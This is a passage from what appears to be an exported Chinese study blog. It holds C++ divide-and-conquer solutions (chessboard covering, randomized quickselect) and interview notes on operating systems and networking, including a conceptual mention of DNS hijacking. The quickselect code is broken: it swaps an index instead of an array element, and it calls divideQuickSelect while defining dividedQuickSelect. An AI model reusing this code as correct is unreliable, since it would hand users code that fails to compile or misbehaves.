		chessBoard<span class="token punctuation">[</span>nr<span class="token punctuation">]</span><span class="token punctuation">[</span>nc<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token function">divideCovering</span><span class="token punctuation">(</span>chessBoard<span class="token punctuation">,</span> dr <span class="token operator">+</span> size<span class="token punctuation">,</span> dc <span class="token operator">+</span> size<span class="token punctuation">,</span> nr<span class="token punctuation">,</span> nc<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">chessBoardCovering</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">&amp;</span> chessBoard<span class="token punctuation">,</span> <span class="token keyword">int</span> sr<span class="token punctuation">,</span> <span class="token keyword">int</span> sc<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> chessBoard<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">divideCovering</span><span class="token punctuation">(</span>chessBoard<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> sr<span class="token punctuation">,</span> sc<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="线性时间选择"><a href="#线性时间选择" class="headerlink" title="线性时间选择"></a>线性时间选择</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/08/26/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E9%80%92%E5%BD%92%E4%B8%8E%E5%88%86%E6%B2%BB%E7%AD%96%E7%95%A5/select.png"></p>
<h2 id="解题代码-1"><a href="#解题代码-1" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">partition</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> randIdx <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> left<span class="token punctuation">;</span> <span class="token comment">// 选取随机pivot</span>
	<span class="token function">swap</span><span class="token punctuation">(</span>randIdx<span class="token punctuation">,</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> pivot <span class="token operator">=</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> right <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span> <span class="token operator">>=</span> pivot<span class="token punctuation">)</span> <span class="token operator">--</span>right<span class="token punctuation">;</span>
		nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> right <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> pivot<span class="token punctuation">)</span> <span class="token operator">++</span>left<span class="token punctuation">;</span>
		nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">=</span> pivot<span class="token punctuation">;</span>
	<span class="token keyword">return</span> left<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">dividedQuickSelect</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">>=</span> right<span class="token punctuation">)</span> <span class="token keyword">return</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> p <span class="token operator">=</span> <span class="token function">partition</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 根据基准进行划分</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> k<span class="token punctuation">)</span> <span class="token keyword">return</span> nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 划分基准正好为第k小的数</span>
	<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">></span> k<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">divideQuickSelect</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> left<span class="token punctuation">,</span> p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 基准大于第k小</span>
	<span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token function">divideQuickSelect</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> right<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 基准小于第k小</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">quickSelect</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设定随机种子</span>
	<span class="token keyword">return</span> <span class="token function">divideQuickSelect</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机基础面试题总结</title>
    <url>/2023/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>承接上文，本文总结了计算机基础学科（包括数据结构、计算机组成原理、操作系统、计算机网络等）常见的一些面试问题，以便随时查看。</p>
<span id="more"></span>

<h1 id="常见的进程调度算法有哪些"><a href="#常见的进程调度算法有哪些" class="headerlink" title="常见的进程调度算法有哪些"></a>常见的进程调度算法有哪些</h1><ul>
<li><p><strong>先来先服务调度算法：</strong>处于就绪态的进程按先后顺序链入到就绪队列中，而先来先去服务调度算法按就绪进程进入就绪队列的先后次序选择当前最先进入就绪队列的进程来执行，直到此进程阻塞或结束，才进行下一次的进程选择调度。</p>
</li>
<li><p><strong>短进程优先调度算法：</strong>是一种按照进程执行时间长短进行调度的算法，即优先调度执行时间短的进程。</p>
</li>
<li><p><strong>优先级调度算法：</strong>优先级调度算法又称优先权调度算法。优先级调度算法每次从就绪队列中选择优先级最高的进程，将处理机分配给它，使之投入运行。</p>
</li>
<li><p><strong>高响应比优先调度算法：</strong>该算法是对 FCFS 调度算法和 SPF 调度算法的一种综合平衡，同时考虑每个进程的等待时间和估计的运行时间。在每次进行进程调度时，先计算就绪队列中每个进程的响应比，从中选出响应比最高的进程投入运行。 </p>
</li>
<li><p><strong>时间片轮转调度算法：</strong>时间片轮转调度算法主要适用于分时系统。每次调度时，把 CPU 分配给队首进程，并令其执行一个时间片。当执行的时间片用完时，由一个计时器发出时钟中断请求，调度程序便据此信号来停止该进程的执行，并将它送往就绪队列的末尾；然后，再把处理机分配给就绪队列中新的队首进程，同时也让它执行一个时间片。</p>
</li>
<li><p><strong>多级反馈队列调度算法：</strong>是一种综合性的调度算法，它将进程队列分成多个队列，每个队列有不同的优先级，每个队列的时间片大小也不同。</p>
</li>
</ul>
<h1 id="什么是大端、小端，如何判断大端和小端"><a href="#什么是大端、小端，如何判断大端和小端" class="headerlink" title="什么是大端、小端，如何判断大端和小端"></a>什么是大端、小端，如何判断大端和小端</h1><h2 id="什么是大端、小端"><a href="#什么是大端、小端" class="headerlink" title="什么是大端、小端"></a>什么是大端、小端</h2><p>大端和小端是指在多字节数据类型的存储方式中，高位字节和低位字节的存储顺序。大端模式是指高位字节存储在低地址，低位字节存储在高地址；小端模式是指低位字节存储在低地址，高位字节存储在高地址。</p>
<h2 id="如何判断大端和小端"><a href="#如何判断大端和小端" class="headerlink" title="如何判断大端和小端"></a>如何判断大端和小端</h2><ul>
<li><p><strong>利用联合体的特性</strong>，将一个多字节的变量和一个字节的变量存放在同一个地址空间中，通过判断该变量的第一个字节的值来判断系统的大小端模式。如果第一个字节的值为 0，那么该系统是大端模式；如果第一个字节的值为 1，那么该系统是小端模式。</p>
</li>
<li><p><strong>利用强制类型转换</strong>，将一个整型变量的地址强制转换为一个字符型指针，然后通过判断该指针所指向的地址的值来判断系统的大小端模式。如果该指针所指向的地址的值为 0，那么该系统是大端模式；如果该指针所指向的地址的值为 1，那么该系统是小端模式。</p>
</li>
</ul>
<h1 id="进程通信的方式有哪些"><a href="#进程通信的方式有哪些" class="headerlink" title="进程通信的方式有哪些"></a>进程通信的方式有哪些</h1><ul>
<li><p><strong>管道</strong>是一种进程间通信的方式，建立在具有血缘关系的进程之上。管道是一种单向通信方式，即发送进程以字符流形式将大量数据送入管道，接收进程可从管道接收数据，二者利用管道进行通信。管道是基于字节流的，管道内部已完成同步机制，数据具有一致性，不被外界打扰。</p>
</li>
<li><p><strong>消息队列</strong>是一种进程间通信的方式，它是一种消息传递机制，即发送进程将消息发送到消息队列，接收进程从消息队列中接收消息。消息队列是基于消息的，消息队列中的消息具有类型，接收进程可以选择接收特定类型的消息。</p>
</li>
<li><p><strong>共享内存</strong>是一种进程间通信的方式，它是一种共享内存区域的机制，即多个进程共享同一块内存区域，进程可以直接访问这块内存区域，从而实现进程间通信。</p>
</li>
<li><p><strong>信号量</strong>是一种进程间通信的方式，它是一种计数器，用于控制多个进程对共享资源的访问。</p>
</li>
<li><p><strong>信号</strong>是一种进程间通信的方式，它是一种软件中断，用于通知进程发生了某个事件。</p>
</li>
<li><p><strong>Socket</strong> 是一种进程间通信的方式，它是一种网络通信机制，可以在不同的主机之间进行通信。</p>
</li>
</ul>
<h1 id="进程有多少种状态，如何转换"><a href="#进程有多少种状态，如何转换" class="headerlink" title="进程有多少种状态，如何转换"></a>进程有多少种状态，如何转换</h1><p>进程有五种状态：创建、就绪、执行、阻塞、终止：</p>
<ul>
<li><strong>创建：</strong>一个进程启动，首先进入创建状态，需要获取系统资源创建进程控制块（PCB：Process Control Block）完成资源分配。</li>
<li><strong>就绪：</strong>在创建状态完成之后，进程已经准备好，处于就绪状态，但是还未获得处理器资源，无法运行。</li>
<li><strong>运行：</strong>获取处理器资源，被系统调度，当具有时间片开始进入运行状态。如果进程的时间片用完了就进入就绪状态。</li>
<li><strong>阻塞：</strong>在运行状态期间，如果进行了阻塞的操作，此时进程暂时无法操作就进入到了阻塞状态，在这些操作完成后就进入就绪状态。等待再次获取处理器资源，被系统调度，当具有时间片就进入运行状态。</li>
<li><strong>终止：</strong>进程结束或者被系统终止，进入终止状态。</li>
</ul>
<h1 id="进程和线程的区别"><a href="#进程和线程的区别" class="headerlink" title="进程和线程的区别"></a>进程和线程的区别</h1><ul>
<li>. 进程有独立的地址空间，线程有自己的堆栈和局部变量，但线程之间没有单独的地址空间； </li>
<li>进程和线程切换时，需要切换进程和线程的上下文，进程的上下文切换时间开销远远大于线程上下文切换时间，耗费资源较大，效率较低； </li>
<li>进程的并发性较低，线程的并发性较高； </li>
<li>每个独立的进程有一个程序运行的入口、顺序执行序列和程序的出口，但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制； </li>
<li>系统在运行的时候会为每个进程分配不同的内存空间；而对线程而言，除了 CPU 外，系统不会为线程分配内存（线程所使用的资源来自其所属进程的资源），线程组之间只能共享资源； </li>
<li>一个进程崩溃后，在保护模式下不会对其他进程产生影响，但是一个线程崩溃整个进程都将崩溃。因此多进程要比多线程健壮。</li>
</ul>
<h1 id="介绍一下死锁，产生的必要条件，产生的原因，如何避免死锁"><a href="#介绍一下死锁，产生的必要条件，产生的原因，如何避免死锁" class="headerlink" title="介绍一下死锁，产生的必要条件，产生的原因，如何避免死锁"></a>介绍一下死锁，产生的必要条件，产生的原因，如何避免死锁</h1><h2 id="什么是死锁"><a href="#什么是死锁" class="headerlink" title="什么是死锁"></a>什么是死锁</h2><p>死锁是指两个或多个进程在执行过程中，因争夺资源而造成的一种僵局，若无外力作用，它们都将无法继续执行下去。</p>
<h2 id="产生的必要条件"><a href="#产生的必要条件" class="headerlink" title="产生的必要条件"></a>产生的必要条件</h2><ul>
<li><strong>互斥条件：</strong>进程要求对所分配的资源进行排它性控制，即在一段时间内某资源仅为一进程所占用。</li>
<li><strong>请求和保持条件：</strong>当进程因请求资源而阻塞时，对已获得的资源保持不放。</li>
<li><strong>不剥夺条件：</strong>进程已获得的资源，在未使用完之前，不能被剥夺，只能在使用完时由自己释放。</li>
<li><strong>循环等待条件：</strong>若干进程之间形成一种头尾相接的循环等待资源关系。</li>
</ul>
<h2 id="产生的原因"><a href="#产生的原因" class="headerlink" title="产生的原因"></a>产生的原因</h2><ul>
<li><strong>系统资源的竞争：</strong>通常系统中拥有的不可剥夺资源，其数量不足以满足多个进程运行的需要，使得进程在运行过程中，会因争夺资源而陷入僵局，如磁带机、打印机等。</li>
<li><strong>进程推进顺序非法：</strong>进程在运行过程中，请求和释放资源的顺序不当，也会导致死锁。</li>
<li><strong>资源分配不当：</strong>系统在资源分配过程中，本身也可能发生错误，如本来应该分配给进程 A 的资源，却分配给了进程 B，这样也可能导致死锁。</li>
</ul>
<h2 id="如何避免死锁"><a href="#如何避免死锁" class="headerlink" title="如何避免死锁"></a>如何避免死锁</h2><ul>
<li><strong>死锁的预防：</strong>破坏互斥条件、破坏请求和保持条件、破坏不剥夺条件、破坏循环等待条件。</li>
<li><strong>死锁的避免：</strong>在资源分配过程中，采用银行家算法，动态地分配资源，避免进程间发生死锁。</li>
<li><strong>死锁的检测与解除：</strong>通过进程的资源分配图，检测系统中是否存在死锁。采用撤销进程、回收资源等方法，解除死锁。</li>
</ul>
<h1 id="介绍一下分段和分页"><a href="#介绍一下分段和分页" class="headerlink" title="介绍一下分段和分页"></a>介绍一下分段和分页</h1><ul>
<li><p><strong>分段</strong>是将程序分成若干个逻辑段，每个段可以包含一个模块或若干个模块，每个段的长度是不固定的，每个段都有一个段名和段长，段名是一个符号，段长是指该段所包含的字节数。分段的主要目的是为了方便程序员编写和修改程序，同时也可以更好地利用内存空间，避免内存碎片的产生。</p>
</li>
<li><p><strong>分页</strong>是将程序和数据分成固定大小的页。每个页都有一个页号和页框号，页号是页在程序或数据中的逻辑地址，页框号是页在内存中的物理地址。分页的主要目的是为了实现非连续分配，以便解决内存碎片问题，或者说分页是由于系统管理的需要。</p>
</li>
</ul>
<h1 id="介绍一下共享内存"><a href="#介绍一下共享内存" class="headerlink" title="介绍一下共享内存"></a>介绍一下共享内存</h1><p>共享内存是一种允许两个或多个进程访问同一块内存的进程间通信方式。共享内存是两个正在运行的进程之间共享和传递数据的一种非常有效的方式。</p>
<p>共享内存的主要优点是速度快，因为数据不需要在进程之间复制，而是直接在内存中传递。共享内存的主要缺点是需要进程之间进行同步，以避免数据的冲突和竞争条件。</p>
<h1 id="介绍一下虚拟内存和物理内存"><a href="#介绍一下虚拟内存和物理内存" class="headerlink" title="介绍一下虚拟内存和物理内存"></a>介绍一下虚拟内存和物理内存</h1><p>虚拟内存和物理内存都是计算机中的内存概念，但它们在实现方式和作用上有所不同。</p>
<p>物理内存是计算机实际物理上存在的内存，也被称为主存储器。它是用来存储程序和数据的地方，数据可以被 CPU 直接访问。物理内存的容量是有限的，因此它通常被操作系统分配给运行程序的进程。</p>
<p>虚拟内存则是一种将物理内存和硬盘空间结合起来的技术。它将物理内存扩展到了硬盘上，使得运行的程序可以访问比物理内存更大的内存空间。虚拟内存由操作系统管理，可以分配给不同的进程使用。当进程需要访问虚拟内存时，操作系统会将需要的部分从硬盘上读取到物理内存中，并将不需要的部分暂时写入硬盘，以便为其他进程或操作系统腾出更多的物理内存空间。</p>
<p>虚拟内存的使用可以让多个进程共享物理内存，并且可以提高系统的整体性能和稳定性，因为操作系统可以更好地管理物理内存的使用。虚拟内存的一个重要作用是，它可以使得进程能够访问比物理内存更大的内存空间，因为它使用硬盘空间作为缓存，允许运行大型应用程序和操作系统。</p>
<h1 id="TCP-和-UDP-的区别是什么"><a href="#TCP-和-UDP-的区别是什么" class="headerlink" title="TCP 和 UDP 的区别是什么"></a>TCP 和 UDP 的区别是什么</h1><p>TCP（传输控制协议）和 UDP（用户数据报协议）都是互联网协议中的传输层协议，它们在传输数据时有一些区别：</p>
<ul>
<li><strong>连接：</strong>TCP 是面向连接的协议，UDP 是无连接的协议。TCP 通过三次握手建立连接，数据传输结束后需要四次挥手断开连接。而 UDP 在传输数据之前不需要建立连接，也不需要断开连接。</li>
<li><strong>可靠性：</strong>TCP 是一种可靠的协议，它通过序号、确认和重传等机制来保证数据传输的可靠性。如果数据丢失或损坏，TCP 会自动重传数据，直到接收方正确接收到数据为止。而 UDP 则没有任何可靠性保障，它只是将数据报发送给接收方，如果数据在传输过程中丢失或损坏，UDP 不会自动重传数据。</li>
<li><strong>传输效率：</strong>UDP 比 TCP 传输效率高。UDP 不需要建立连接、维护状态等，因此可以更快地传输数据。但是，由于 UDP 没有可靠性保障，如果出现数据丢失或损坏，需要应用层自己处理。</li>
<li><strong>消息大小：</strong>TCP 可以传输大型数据，而 UDP 只能传输小型数据。TCP 在传输数据时会将数据分成多个小块，每个小块都有序号和确认机制，可以保证数据的完整性。而 UDP 每个数据包的大小限制在 64KB 以内，超过这个限制需要应用层进行分割。</li>
<li><strong>应用场景：</strong>TCP 适合用于可靠性要求高、数据量较大的场景，例如文件传输、网页访问等。而 UDP 适合用于实时性要求高、数据量较小的场景，例如语音通话、视频会议等。</li>
</ul>
<h1 id="TCP-三次握手四次挥手的过程是什么"><a href="#TCP-三次握手四次挥手的过程是什么" class="headerlink" title="TCP 三次握手四次挥手的过程是什么"></a>TCP 三次握手四次挥手的过程是什么</h1><h2 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h2><ol>
<li> 客户端向服务器发送 SYN 报文，表示请求连接。</li>
<li> 服务器接收到 SYN 报文后，发送一个 ACK 报文，表示确认收到客户端请求，并且向客户端发送一个 SYN 报文，表示同意连接。</li>
<li> 客户端接收到服务器的 SYN 和 ACK 报文后，向服务器发送一个 ACK 报文，表示确认连接建立成功。</li>
</ol>
<p>三次握手完成后，客户端和服务器之间建立了一个可靠的连接，可以进行数据传输。</p>
<h2 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h2><ol>
<li>客户端向服务器发送一个 FIN 报文，表示要关闭连接。</li>
<li>服务器接收到 FIN 报文后，发送一个 ACK 报文，表示确认收到客户端的请求，但是还没有准备好关闭连接。</li>
<li>服务器准备好关闭连接后，向客户端发送一个 FIN 报文，表示要关闭连接。</li>
<li>客户端接收到服务器的 FIN 报文后，发送一个 ACK 报文，表示确认收到服务器的请求，然后等待两个 MSL （最长报文段寿命）后自动关闭连接。</li>
</ol>
<p>四次挥手完成后，客户端和服务器之间的连接被释放，不再进行数据传输。</p>
<h1 id="介绍一下-OSI-七层模型"><a href="#介绍一下-OSI-七层模型" class="headerlink" title="介绍一下 OSI 七层模型"></a>介绍一下 OSI 七层模型</h1><p>OSI 七层模型是一种网络协议的分层模型，它把网络协议从逻辑上分为了 7 层，每一层都有相关、相对应的物理设备。这 7 层分别为：物理层、数据链路层、网络层、传输层、会话层、表示层、应用层。</p>
<p>这 7 层的具体功能如下：</p>
<ol>
<li> <strong>物理层：</strong>定义了物理媒介的规范，如传输速率、信号类型、线路编码等。</li>
<li><strong>数据链路层：</strong>为物理层提供服务，定义了数据在物理媒介上的传输规范，如帧的格式、数据的传输和接收、差错校验等。</li>
<li><strong>网络层：</strong>负责在不同的网络之间进行数据传输，包括路由选择、拥塞控制、逻辑寻址等。</li>
<li><strong>传输层：</strong>负责提供端到端的数据传输，包括数据的分段、传输控制、差错恢复等。</li>
<li><strong>会话层：</strong>管理不同设备之间的会话，包括会话的建立、维护和结束。</li>
<li><strong>表示层：</strong>负责数据的格式转换、加密解密、数据压缩等。</li>
<li><strong>应用层：</strong>负责向用户提供网络服务，包括电子邮件、文件传输、远程登录等。</li>
</ol>
<h1 id="TCP-如何实现可靠传输"><a href="#TCP-如何实现可靠传输" class="headerlink" title="TCP 如何实现可靠传输"></a>TCP 如何实现可靠传输</h1><ol>
<li><strong>超时重传机制：</strong>TCP 通过使用确认和超时机制来检测丢失的分组并进行重传。当发送方发送一个分组后，会等待接收方发送确认信息，如果在指定的时间内没有收到确认信息，TCP 就会认为这个分组丢失了，然后重新发送。</li>
<li><strong>滑动窗口机制：</strong>TCP 采用滑动窗口技术来控制传输的速度。发送方和接收方都有一个窗口大小的参数，发送方根据接收方发送的确认信息来调整窗口大小，从而保证传输的可靠性和效率。</li>
<li><strong>流量控制：</strong>TCP 使用流量控制来防止发送方发送过多的数据导致接收方的缓存区溢出。接收方可以向发送方发送窗口大小信息，告诉发送方还能接收多少数据，从而实现流量控制。</li>
<li><strong>拥塞控制：</strong>TCP 通过拥塞控制来避免网络拥塞。发送方会根据网络的拥塞情况来调整发送速率，从而避免过多的数据包在网络中堆积导致网络拥塞。</li>
</ol>
<p>通过上述可靠传输机制，TCP 协议可以在网络不可靠、有丢失和错误的情况下，保证数据传输的可靠性和正确性，从而被广泛应用于各种应用场景。</p>
<h1 id="TCP-和-UDP-的使用场景"><a href="#TCP-和-UDP-的使用场景" class="headerlink" title="TCP 和 UDP 的使用场景"></a>TCP 和 UDP 的使用场景</h1><ul>
<li><p>TCP 适用于要求数据传输可靠性和完整性的场景，如文件传输、电子邮件、网页浏览、远程登录等。由于 TCP 提供了可靠的数据传输和错误处理，这些应用能够保证数据的正确性和完整性，但是 TCP 的建立连接和维护状态等操作会增加传输的时延，适合对速度要求不是特别高的应用。</p>
</li>
<li><p>UDP 适用于对实时性和传输速度要求较高的场景，如视频会议、实时游戏等。UDP 不保证数据传输的可靠性，但是它传输速度快，且不需要建立连接和维护状态等操作，适合对实时性和传输速度要求较高的应用场景。</p>
</li>
</ul>
<h1 id="UDP-怎么实现可靠传输"><a href="#UDP-怎么实现可靠传输" class="headerlink" title="UDP 怎么实现可靠传输"></a>UDP 怎么实现可靠传输</h1><ul>
<li><p><strong>应用层重传：</strong>在应用层实现数据的重传机制，当收到 ACK 包时，如果发现某个数据包没有收到 ACK 包的确认，则重新发送该数据包，直到收到 ACK 包的确认。</p>
</li>
<li><p><strong>数据包校验和：</strong>在数据包中添加校验和，用来检测数据包是否发生错误，如果发现数据包发生错误，则进行重传。</p>
</li>
<li><p><strong>超时重传：</strong>发送方在发送数据包时，设置一个超时时间，如果在该时间内没有收到 ACK 包的确认，则进行数据包的重传。</p>
</li>
<li><p><strong>序列号机制：</strong>在发送数据包时，为每个数据包添加一个序列号，接收方收到数据包后，对数据包进行排序，如果发现数据包乱序，则进行重排序。</p>
</li>
</ul>
<h1 id="介绍一下滑动窗口机制"><a href="#介绍一下滑动窗口机制" class="headerlink" title="介绍一下滑动窗口机制"></a>介绍一下滑动窗口机制</h1><p>滑动窗口机制是一种流量控制方法，它允许发送方在停止并等待确认前连续发送多个分组，而不必每发送一个分组就停下来等待确认，从而增加数据传输的速率提高应用的吞吐量。</p>
<p>滑动窗口机制通过动态改变窗口大小来调节两台主机间数据传输。滑动窗口机制的基本原理是：发送方和接收方各自维护一个窗口，窗口大小是动态变化的，窗口大小的变化取决于网络的拥塞情况和接收方的处理能力。</p>
<h1 id="浏览器从输入-URL-到页面显示内容，中间发生了什么"><a href="#浏览器从输入-URL-到页面显示内容，中间发生了什么" class="headerlink" title="浏览器从输入 URL 到页面显示内容，中间发生了什么"></a>浏览器从输入 URL 到页面显示内容，中间发生了什么</h1><ol>
<li><strong>DNS 解析：</strong>浏览器根据 URL 中的主机名进行 DNS 解析，将域名解析成 IP 地址。</li>
<li><strong>TCP 连接：</strong>浏览器使用 HTTP 协议通过 TCP 与服务器建立连接。</li>
<li><strong>发送 HTTP 请求：</strong>浏览器向服务器发送 HTTP 请求，请求中包含请求方法、请求头部、请求正文等内容。</li>
<li><strong>服务器处理请求：</strong>服务器接收到请求后，会根据请求的内容进行处理，处理完后会将响应结果返回给浏览器。</li>
<li><strong>接收 HTTP 响应：</strong>浏览器接收到 HTTP 响应，响应中包含响应头部、响应状态码、响应正文等内容。</li>
<li><strong>解析 HTML：</strong>浏览器根据响应内容中的 HTML 标签和文本内容，解析成 DOM 树。</li>
<li><strong>加载 CSS 和 JavaScript：</strong>浏览器根据 HTML 中的链接标签和脚本标签，加载相应的 CSS 和 JavaScript 文件，并执行其中的代码。</li>
<li><strong>渲染页面：</strong>浏览器根据 DOM 树和 CSS 样式表中的样式信息，将页面渲染出来，包括布局、绘制等过程。</li>
<li><strong>关闭 TCP 连接：</strong>浏览器在完成页面渲染后，会关闭与服务器之间的 TCP 连接。</li>
</ol>
<p>总的来说，浏览器从输入 URL 到页面显示内容，经历了 DNS 解析、TCP 连接、HTTP 请求、服务器处理请求、HTTP 响应、解析 HTML、加载 CSS 和 JavaScript、渲染页面、关闭 TCP 连接等多个步骤。</p>
<h1 id="介绍一下-DNS-解析过程以及-DNS-劫持"><a href="#介绍一下-DNS-解析过程以及-DNS-劫持" class="headerlink" title="介绍一下 DNS 解析过程以及 DNS 劫持"></a>介绍一下 DNS 解析过程以及 DNS 劫持</h1><h2 id="DNS-解析过程"><a href="#DNS-解析过程" class="headerlink" title="DNS 解析过程"></a>DNS 解析过程</h2><ol>
<li>浏览器首先会检查本地缓存，看是否已经存在该域名的解析结果。如果存在，则直接使用缓存中的解析结果。</li>
<li>如果本地缓存中不存在该域名的解析结果，则会向本地 DNS 服务器发送查询请求。本地 DNS 服务器一般由 ISP（Internet Service Provider）提供，它会缓存一些常用的域名解析结果。如果本地 DNS 服务器缓存中存在该域名的解析结果，则直接返回给浏览器。</li>
<li>如果本地 DNS 服务器缓存中也不存在该域名的解析结果，则会向根域名服务器发送查询请求。根域名服务器会告诉本地 DNS 服务器该域名对应的顶级域名服务器的 IP 地址。</li>
<li>本地 DNS 服务器会向顶级域名服务器发送查询请求。顶级域名服务器会告诉本地 DNS 服务器该域名对应的权威域名服务器的 IP 地址。</li>
<li>本地 DNS 服务器向权威域名服务器发送查询请求。权威域名服务器会返回该域名的解析结果，本地 DNS 服务器将结果缓存起来，并将结果返回给浏览器。</li>
<li>浏览器使用该域名对应的 IP 地址与服务器建立连接，并获取相应的资源。</li>
</ol>
<h2 id="DNS-劫持"><a href="#DNS-劫持" class="headerlink" title="DNS 劫持"></a>DNS 劫持</h2><p>DNS 劫持指的是黑客通过某种手段篡改了 DNS 解析结果，将用户访问的域名指向了恶意服务器，从而实现网络攻击。常见的 DNS 劫持方式包括：</p>
<ul>
<li><p>DNS 缓存投毒：黑客利用漏洞将恶意的 DNS 解析结果注入到 DNS 缓存中。</p>
</li>
<li><p>劫持 DNS 服务器：黑客攻击 DNS 服务器，修改服务器的 DNS 解析结果。</p>
</li>
<li><p>本地 Hosts 文件劫持：黑客通过修改本地 Hosts 文件，将用户访问的域名指向恶意 IP 地址。</p>
</li>
</ul>
